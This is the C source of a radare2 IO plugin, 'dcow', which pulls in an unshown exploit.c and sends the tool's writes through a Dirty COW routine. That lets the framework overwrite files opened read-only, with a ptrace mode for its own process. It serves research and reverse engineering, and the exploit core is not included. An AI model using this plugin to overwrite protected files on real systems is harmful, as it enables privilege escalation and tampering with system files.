/* radare - LGPL - Copyright 2016 - pancake@nowsecure.com */

#include <r_userconf.h>
#include <r_io.h>
#include <r_lib.h>

static int LOOPS = 10000;
#include "exploit.c"

RIOPlugin r_io_plugin_dcow;

typedef struct r_io_mmo_t {
	char *filename;
	int mode;
	int flags;
	int fd;
	int opened;
	ut8 modified;
	RBuffer *buf;
	RIO * io_backref;
	bool force_ptrace;
} RIOdcowFileObj;

static ut64 r_io_dcow_seek(RIO *io, RIOdcowFileObj *mmo, ut64 offset, int whence) {
	switch (whence) {
	case SEEK_SET:
		io->off = offset;
		break;
	case SEEK_CUR:
		io->off += offset;
		break;
	case SEEK_END:
		io->off = UT64_MAX;
		break;
	}
	return io->off;
}

static void r_io_dcow_free (RIOdcowFileObj *mmo) {
	free (mmo->filename);
	memset (mmo, 0, sizeof (RIOdcowFileObj));
	free (mmo);
}

RIOdcowFileObj *r_io_dcow_create_new_file(RIO  *io, const char *filename, int mode, int flags) {
	if (!io) {
		return NULL;
	}
	RIOdcowFileObj *mmo = R_NEW0 (RIOdcowFileObj);
	if (!mmo) {
		return NULL;
	}
	mmo->filename = strdup (filename);
	mmo->fd = r_num_rand (0xFFFF); // XXX: Use r_io_fd api
	mmo->mode = mode;
	mmo->flags = flags;
	mmo->io_backref = io;
	return mmo;
}

static int r_io_dcow_check (const char *filename) {
	return (filename && !strncmp (filename, "dcow://", 7) && *(filename + 7));
}

static RIODesc *r_io_dcow_open(RIO *io, const char *file, int flags, int mode) {
	const char* name = !strncmp (file, "dcow://", 7) ? file + 7 : file;
	int f = open(name, O_RDONLY);
	if (f == -1) {
		return NULL;
	}
	close(f);
	RIOdcowFileObj *mmo;
	if (!(mmo = r_io_dcow_create_new_file (io, name, mode, flags))) {
		return NULL;
	}
	return r_io_desc_new (&r_io_plugin_dcow, mmo->fd,
		mmo->filename, flags, mode, mmo);
}

static bool __plugin_open(RIO *io, const char *file, bool many) {
	return r_io_dcow_check (file);
}

static RIODesc *__open(RIO *io, const char *file, int flags, int mode) {
	if (!r_io_dcow_check (file)) {
		return NULL;
	}
	return r_io_dcow_open (io, file, flags, mode);
}

static int __read(RIO *io, RIODesc *fd, ut8 *buf, int len) {
	if (!fd || !fd->data || !buf) {
		return -1;
	}

	ut64 off = io->off;
	RIOdcowFileObj *mmo = fd->data;
	int f = open(mmo->filename, O_RDONLY);
	if (f == -1) {
		return -1;
	}
	(void)lseek (f, io->off, SEEK_SET);
	len = read (f, buf, len);
	io->off = off;
	close (f);
	return len;
}

static int __write(RIO *io, RIODesc *fd, const ut8 *buf, int len) {
	if (!io || !fd || !fd->data || !buf) {
		return -1;
	}
	RIOdcowFileObj *mmo = fd->data;
	int i;
	const int bs = 1024; // use pagesize here
	const char *file = mmo->filename;
	if (mmo->force_ptrace || !strcmp (file, "self")) {
		file = NULL;
	}

	for (i = 0; i<len; i+= bs) {
		int pc = i * 100 / len;
		eprintf ("\rDirtycowing %d%% ", pc);
		dirtycow (file, io->off + i,
			buf + i, R_MIN (len - i, bs));
	}
	eprintf ("\rDirtycowing 100%%\n");
	return len;
}

static ut64 __lseek(RIO *io, RIODesc *fd, ut64 offset, int whence) {
	if (!fd || !fd->data) {
		return -1;
	}
	RIOdcowFileObj *mmo = fd->data;
	return r_io_dcow_seek (io, mmo, offset, whence);
}

static int __close(RIODesc *fd) {
	if (!fd || !fd->data) {
		return -1;
	}
	r_io_dcow_free ((RIOdcowFileObj *) fd->data);
	fd->data = NULL;
	return 0;
}

static int __system(RIO *io, RIODesc *fd, const char *command) {
	if (!fd || !fd->data || !command) {
		return -1;
	}
	ut64 off = io->off;
	RIOdcowFileObj *mmo = fd->data;
	if (!strcmp (command, "?")) {
		eprintf ("Dirtycow IO commands:\n");
		eprintf ("=!loop 10000\n");
		eprintf ("=!ptrace\n");
		eprintf ("=!mmap\n");
	} else if (!strcmp (command, "ptrace")) {
		mmo->force_ptrace = true;
	} else if (!strcmp (command, "mmap")) {
		mmo->force_ptrace = false;
	} else if (!strncmp (command, "loop ", 5)) {
		LOOPS = atoi (command + 5);
	}
}

RIOPlugin r_io_plugin_dcow = {
	.name = "dcow",
	.desc = "dirty cow baked IO for r2 dcow://[path]",
	.license = "LGPL",
	.open = __open,
	.close = __close,
	.read = __read,
	.check = __plugin_open,
	.lseek = __lseek,
	.write = __write,
	.system = __system,
};

#ifndef CORELIB
RLibStruct radare_plugin = {
	.type = R_LIB_TYPE_IO,
	.data = &r_io_plugin_dcow,
	.version = R2_VERSION
};
#endif
